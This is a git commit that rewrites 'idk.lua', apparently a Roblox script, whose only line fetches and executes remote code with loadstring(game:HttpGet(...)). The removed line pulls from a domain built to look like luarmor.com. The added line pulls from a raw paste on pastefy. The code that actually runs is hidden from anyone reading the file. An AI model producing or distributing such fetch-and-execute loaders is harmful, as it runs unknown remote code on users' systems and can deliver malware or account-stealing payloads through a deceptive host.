bfbbb4cd16a2855030fadf6f996c329bbadfbd02
nexoradisc-create <nexoradisc@gmail.com>
2026-04-28 22:47:26 +0300

    Update idk.lua

--- idk.lua
+++ idk.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://api.luarmor.com.shub-scripts.com/files/v4/loaders/665adac8d59114ef9ff31e3e95f074b9"))();
+loadstring(game:HttpGet("https://pastefy.app/yzMrWI3k/raw"))()
